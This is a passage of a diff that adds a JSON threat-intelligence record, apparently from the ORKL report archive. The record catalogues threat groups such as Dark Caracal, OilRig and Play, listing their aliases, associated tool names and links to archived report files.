+                "TAG-CT3"
+            ],
+            "source_name": "ETDA:Dark Caracal",
+            "tools": [
+                "Bandok",
+                "Bandook",
+                "CrossRAT",
+                "FinFisher",
+                "FinFisher RAT",
+                "FinSpy",
+                "Pallas",
+                "Trupto"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
+            "created_at": "2022-10-25T16:07:24.139848Z",
+            "updated_at": "2025-03-27T02:02:10.120505Z",
+            "deleted_at": null,
+            "main_name": "Safe",
+            "aliases": [],
+            "source_name": "ETDA:Safe",
+            "tools": [
+                "DebugView",
+                "LZ77",
+                "OpenDoc",
+                "SafeDisk",
+                "TypeConfig",
+                "UPXShell",
+                "UsbDoc",
+                "UsbExe"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "4a62c0be-1583-4d82-8f91-46e3a1c114e6",
+            "created_at": "2023-01-06T13:46:38.73639Z",
+            "updated_at": "2025-03-27T02:00:02.905024Z",
+            "deleted_at": null,
+            "main_name": "Dark Caracal",
+            "aliases": [
+                "G0070"
+            ],
+            "source_name": "MISPGALAXY:Dark Caracal",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "8de10e16-817c-4907-bd98-b64cf4a3e77b",
+            "created_at": "2022-10-25T15:50:23.552766Z",
+            "updated_at": "2025-03-27T02:00:55.497706Z",
+            "deleted_at": null,
+            "main_name": "Dark Caracal",
+            "aliases": [
+                "Dark Caracal"
+            ],
+            "source_name": "MITRE:Dark Caracal",
+            "tools": [
+                "FinFisher",
+                "CrossRAT",
+                "Bandook"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
+            "created_at": "2022-10-25T15:50:23.38055Z",
+            "updated_at": "2025-03-27T02:00:55.459558Z",
+            "deleted_at": null,
+            "main_name": "OilRig",
+            "aliases": [
+                "COBALT GYPSY",
+                "IRN2",
+                "APT34",
+                "Helix Kitten",
+                "Evasive Serpens",
+                "Hazel Sandstorm",
+                "EUROPIUM",
+                "ITG13"
+            ],
+            "source_name": "MITRE:OilRig",
+            "tools": [
+                "ISMInjector",
+                "RDAT",
+                "Systeminfo",
+                "QUADAGENT",
+                "OopsIE",
+                "Tasklist",
+                "certutil",
+                "ZeroCleare",
+                "POWRUNER",
+                "netstat",
+                "ipconfig",
+                "LaZagne",
+                "BONDUPDATER",
+                "SideTwist",
+                "PsExec",
+                "SEASHARPEE",
+                "Mimikatz",
+                "RGDoor",
+                "ftp"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
+            "created_at": "2023-01-06T13:46:38.495593Z",
+            "updated_at": "2025-03-27T02:00:02.848206Z",
+            "deleted_at": null,
+            "main_name": "OilRig",
+            "aliases": [
+                "IRN2",
+                "Hazel Sandstorm",
+                "EUROPIUM",
+                "TA452",
+                "Earth Simnavaz",
+                "Cobalt Gypsy",
+                "Crambus",
+                "Helix Kitten",
+                "APT 34",
+                "APT34",
+                "ATK40",
+                "G0049",
+                "Evasive Serpens",
+                "Twisted Kitten"
+            ],
+            "source_name": "MISPGALAXY:OilRig",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
+            "created_at": "2024-11-01T02:00:52.756877Z",
+            "updated_at": "2025-03-27T02:00:55.544216Z",
+            "deleted_at": null,
+            "main_name": "Play",
+            "aliases": null,
+            "source_name": "MITRE:Play",
+            "tools": [
+                "Nltest",
+                "AdFind",
+                "PsExec",
+                "Wevtutil",
+                "Cobalt Strike",
+                "Playcrypt",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535680,
+    "ts_updated_at": 1743041786,
+    "ts_creation_date": 1653787356,
+    "ts_modification_date": 1653787356,
+    "files": {
+        "pdf": "https://archive.orkl.eu/133236514dcf211f55d62d3a5f3e2df62a3aa91d.pdf",
+        "text": "https://archive.orkl.eu/133236514dcf211f55d62d3a5f3e2df62a3aa91d.txt",
+        "img": "https://archive.orkl.eu/133236514dcf211f55d62d3a5f3e2df62a3aa91d.jpg"
+    }
+}
